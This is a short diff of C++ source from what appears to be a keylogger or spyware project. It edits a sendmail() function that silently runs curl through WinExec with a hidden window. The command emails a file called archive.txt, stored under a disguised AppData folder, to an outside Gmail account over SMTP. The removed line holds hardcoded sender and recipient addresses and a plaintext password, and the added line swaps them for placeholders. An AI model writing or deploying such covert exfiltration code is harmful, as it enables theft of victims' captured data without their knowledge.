@@ -184,7 +184,7 @@ int resetLog(char const* file) {
 int sendmail(){
     string path = getenv("USERPROFILE");
     path.append("\\AppData\\Roaming\\Microsoft Windows\\archive.txt");
-    string test = ("curl smtp://smtp.gmail.com:587 -v --mail-from \"sabourinresearchproject@gmail.com\" --mail-rcpt \"SHUResearchProject2021@gmail.com\" --ssl -u sabourinresearchproject@gmail.com:ResearchProject21! -T \""+path+"\" -k --anyauth");
+    string test = ("curl smtp://smtp.gmail.com:587 -v --mail-from \"{SEND EMAIL}\" --mail-rcpt \"RECIEVE EMAIL\" --ssl -u {SEND EMAIL:SEND EMAIL PASSWORD} -T \""+path+"\" -k --anyauth");
     const char* command = test.c_str();//Converts string to const char*
     WinExec(command, SW_HIDE);//Runs the libcurl command
     return 0;
